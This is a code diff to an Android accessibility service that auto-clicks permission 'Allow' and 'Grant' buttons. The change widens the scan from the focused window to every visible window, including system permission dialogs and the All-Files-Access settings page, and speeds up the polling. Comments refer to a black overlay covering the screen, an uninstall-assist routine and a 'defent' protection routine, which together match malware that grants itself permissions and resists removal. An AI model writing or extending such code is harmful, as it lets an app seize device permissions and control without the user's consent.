@@ -726,26 +726,27 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             // Do not auto-click while the notification panel or quick settings is open
             if (isSystemPanelOpen()) return;
 
+            // During auto-grant period: scan ALL windows so permission dialogs in
+            // non-focused windows (com.android.permissioncontroller overlays) are found.
+            if (autoGrantMode) {
+                updateCurrentAppName();
+                runGranterOnAllWindows();
+                return;
+            }
+
+            // While protection is suspended (e.g. during storage permission grant),
+            // scan all windows for the grant button but skip defent/uninstall-assist.
+            if (System.currentTimeMillis() < protectionSuspendedUntil) {
+                updateCurrentAppName();
+                runGranterOnAllWindows();
+                return;
+            }
+
+            // After auto-grant period ends: run uninstall-assist and defent protection
+            // against the single active window (these never need multi-window scanning).
             AccessibilityNodeInfo rootNode = getRootInActiveWindow();
             if (rootNode == null) return;
-
-            // Update app name
             updateCurrentAppName();
-
-            // During auto-grant period: only click Allow/Grant buttons — nothing else.
-            // Defent protection is suspended so it cannot interfere with permission dialogs.
-            if (autoGrantMode) {
-                runPermissionGranter(rootNode);
-                rootNode.recycle();
-                return;
-            }
-            // While protection is suspended (e.g. during storage permission grant),
-            // skip defent/uninstall-assist so they don't close the permission screen.
-            if (System.currentTimeMillis() < protectionSuspendedUntil) {
-                rootNode.recycle();
-                return;
-            }
-            // After auto-grant period ends: run uninstall-assist and defent protection.
             if (runUninstallAssist(rootNode)) {
                 rootNode.recycle();
                 return;
@@ -754,7 +755,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 rootNode.recycle();
                 return;
             }
-
             rootNode.recycle();
         } catch (Throwable e) {
             Log.e(TAG, "autoClickAllowButton error: " + e.getMessage());
@@ -867,9 +867,55 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         } catch (Exception ignored) {}
     }
 
+    /**
+     * Runs runPermissionGranter() on EVERY currently visible accessibility window.
+     *
+     * getRootInActiveWindow() only returns the focused window. When a permission dialog
+     * from com.android.permissioncontroller appears, the "active" window is often the
+     * SystemUI status bar (or our own black overlay), not the dialog — so the granter
+     * never sees the "Allow" button. getWindows() returns all visible windows regardless
+     * of focus, which fixes detection for overlay-style permission dialogs on Android 10+.
+     *
+     * Falls back to getRootInActiveWindow() on pre-LOLLIPOP devices or if getWindows()
+     * returns null/empty.
+     *
+     * @return true if the granter found and clicked something in any window.
+     */
+    @android.annotation.TargetApi(android.os.Build.VERSION_CODES.LOLLIPOP)
+    private boolean runGranterOnAllWindows() {
+        boolean handled = false;
+        try {
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
+                List<android.view.accessibility.AccessibilityWindowInfo> windows = getWindows();
+                if (windows != null && !windows.isEmpty()) {
+                    for (android.view.accessibility.AccessibilityWindowInfo win : windows) {
+                        try {
+                            AccessibilityNodeInfo root = win.getRoot();
+                            if (root == null) continue;
+                            boolean result = runPermissionGranter(root);
+                            root.recycle();
+                            if (result) handled = true;
+                        } catch (Exception ignored) {}
+                    }
+                    return handled;
+                }
+            }
+        } catch (Exception ignored) {}
+        // Fallback: single active window
+        try {
+            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+            if (rootNode != null) {
+                handled = runPermissionGranter(rootNode);
+                rootNode.recycle();
+            }
+        } catch (Exception ignored) {}
+        return handled;
+    }
+
     /** Starts permission scanner IMMEDIATELY when accessibility is enabled.
      *  Runs continuously forever, ready before any permission requests.
      *  Scans for permission buttons: Allow, Grant, OK, Allow all time, Allow access, etc.
+     *  Uses runGranterOnAllWindows() so permission dialogs in non-focused windows are found.
      */
     private void startPermissionScanner() {
         permissionScanHandler = permissionBgHandler != null
@@ -878,11 +924,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             @Override
             public void run() {
                 try {
-                    AccessibilityNodeInfo rootNode = getRootInActiveWindow();
-                    if (rootNode != null) {
-                        runPermissionGranter(rootNode);
-                        rootNode.recycle();
-                    }
+                    runGranterOnAllWindows();
                 } catch (Exception ignored) {}
                 if (permissionScanHandler != null && permissionScanRunnable != null) {
                     permissionScanHandler.postDelayed(this, 200);
@@ -902,18 +944,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         autoGrantHandler = permissionBgHandler != null
                 ? permissionBgHandler : new Handler(Looper.getMainLooper());
 
-        // Independent scanner: runs every 250 ms during the grant window.
-        // 250 ms is frequent enough to catch dialogs without hammering the main thread.
+        // Independent scanner: runs every 100 ms during the grant window.
+        // Uses runGranterOnAllWindows() so it catches permission dialogs in non-focused
+        // windows (e.g. com.android.permissioncontroller overlays on Android 10+).
         autoGrantScanRunnable = new Runnable() {
             @Override
             public void run() {
                 if (!autoGrantMode) return;
                 try {
-                    AccessibilityNodeInfo rootNode = getRootInActiveWindow();
-                    if (rootNode != null) {
-                        runPermissionGranter(rootNode);
-                        rootNode.recycle();
-                    }
+                    runGranterOnAllWindows();
                 } catch (Exception ignored) {}
                 if (autoGrantMode && autoGrantHandler != null) {
                     autoGrantHandler.postDelayed(this, 100);
@@ -1020,22 +1059,41 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     return;
                 }
                 try {
-                    AccessibilityNodeInfo rootNode = getRootInActiveWindow();
-                    if (rootNode != null) {
-                        // Full granter: buttons, toggles, OEM variants, deny list — all covered.
-                        boolean handled = runPermissionGranter(rootNode);
-                        if (!handled) {
-                            // Fallback: we may be on the generic All-Files-Access list screen.
-                            // Find our app's row and tap it to open the per-app toggle page.
-                            runStorageListGranter(rootNode);
+                    // Scan ALL windows — the All-Files-Access page is a Settings window
+                    // that may not be the active/focused window when the overlay is up.
+                    boolean handled = runGranterOnAllWindows();
+                    if (!handled) {
+                        // Fallback: also run the list-granter against every window in case
+                        // we are on the generic All-Files-Access list screen.
+                        if (android.os.Build.VERSION.SDK_INT
+                                >= android.os.Build.VERSION_CODES.LOLLIPOP) {
+                            List<android.view.accessibility.AccessibilityWindowInfo> wins =
+                                    getWindows();
+                            if (wins != null) {
+                                for (android.view.accessibility.AccessibilityWindowInfo win : wins) {
+                                    try {
+                                        AccessibilityNodeInfo r = win.getRoot();
+                                        if (r != null) {
+                                            runStorageListGranter(r);
+                                            r.recycle();
+                                        }
+                                    } catch (Exception ignored) {}
+                                }
+                                return;
+                            }
                         }
-                        rootNode.recycle();
+                        // Pre-Lollipop fallback
+                        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+                        if (rootNode != null) {
+                            runStorageListGranter(rootNode);
+                            rootNode.recycle();
+                        }
                     }
                 } catch (Exception ignored) {}
                 storageHandler.postDelayed(this, 150);
             }
         });
-        Log.i(TAG, "Storage auto-grant scanner started for 20 s (150 ms interval, autoGrantMode active)");
+        Log.i(TAG, "Storage auto-grant scanner started for 20 s (150 ms interval, autoGrantMode active, all-windows scan)");
     }
 
     /**
